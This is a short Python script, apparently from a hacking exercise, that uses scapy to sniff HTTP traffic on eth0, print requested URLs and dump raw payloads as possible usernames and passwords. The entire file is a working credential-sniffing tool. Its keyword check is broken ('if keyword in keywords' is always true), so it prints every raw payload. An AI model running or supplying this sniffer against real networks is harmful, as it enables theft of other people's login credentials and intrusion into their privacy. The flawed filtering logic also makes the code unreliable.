#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["uname", "username", "login", "password", "pass", "passwd"]
        for keyword in keywords:
            if keyword in keywords:
                return load

def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request" + str(url))
        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possibel Username/Password Found" + str(login_info) + "\n\n")

sniff("eth0")